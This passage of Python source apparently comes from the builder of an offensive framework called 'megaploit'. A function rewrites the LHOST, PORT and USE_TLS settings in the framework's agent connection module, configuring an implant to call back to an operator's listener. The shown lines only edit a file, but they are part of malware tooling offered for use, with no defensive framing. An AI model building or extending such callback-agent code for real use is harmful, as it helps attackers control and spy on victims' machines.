    so that the values take effect when agent.py imports the module.
    """
    _patch_connection_module(lhost, port, use_tls)
    print(ok(f"agent.py patched: LHOST={lhost}  PORT={port}  USE_TLS={use_tls}"))


def _patch_connection_module(lhost: str, port: int, use_tls: bool) -> None:
    """Overwrite the LHOST / PORT / USE_TLS lines in connection.py using regex."""
    import re
    path = os.path.join("megaploit", "agent", "connection.py")
    try:
        with open(path, "r", encoding="utf-8") as f:
            src = f.read()

        src = re.sub(r'^LHOST\s*=.*$',
                     f'LHOST   = "{lhost}"',
                     src, flags=re.MULTILINE)
        src = re.sub(r'^PORT\s*=.*$',
                     f'PORT    = {port}',
                     src, flags=re.MULTILINE)
        src = re.sub(r'^USE_TLS\s*=.*$',
                     f'USE_TLS = {use_tls}   # patched by server',
                     src, flags=re.MULTILINE)

        with open(path, "w", encoding="utf-8") as f:
            f.write(src)
    except IOError as e:
        print(err(f"Patch failed: {e}"))
